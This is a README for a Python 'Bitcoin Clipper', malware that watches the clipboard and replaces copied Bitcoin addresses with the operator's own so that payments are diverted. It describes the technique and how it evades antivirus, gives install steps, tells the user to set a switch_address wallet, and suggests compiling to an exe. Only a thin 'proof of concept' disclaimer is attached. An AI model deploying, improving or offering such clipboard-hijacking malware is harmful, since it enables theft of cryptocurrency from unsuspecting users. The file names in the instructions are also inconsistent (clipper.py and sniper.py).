# Bitcoin Clipper

Working Bitcoin Clipper malware created in Python that can change addresses in sentences or just an address by itself, fast and efficient so it always works before the address is pasted.

## About
Bitcoin Clipper malware is a type of malware that waits until a user copies a Bitcoin address to their clipboard, it then verifies that it is not just a string of words and it is infact a Bitcoin Address or close to one and then it switches that address for our new Bitcoin address. 

CyberCriminals use this type of malware because it is hard to detect by anti-virus as it is not doing anything but checking and changing the content on the users clipboard. However this allows CyberCriminals to make money without users realising to fast.  

## Installation
Download the project files then follow the instructions below.

Open your terminal in the path of the malware and run this:
```bash
pip install -r requirements.txt
```
then..

Open clipper.py and change **switch_address** to your bitcoin address.
```bash
switch_address: str = "bc1qg7dvftcxxw5cphdrn3ddhawr000ft3um9gs788"
```

    
## Run the program
I recommend that you compile it to an exe which you can find a tutorial for online however if you just wanna run it on your PC do the following:
```bash
python sniper.py 
OR 
python3 sniper.py
```

## NOTE:
The Bitcoin Clipper works however it is supposed to be a proof of concept, please do not use this with intent to actually make money from this, I have not added instructions on how to compile the malware to try and prevent people from trying to use this in some sort of production enviroment, please ONLY use it on your OWN Computer as compiling it and spreading it is against the law.
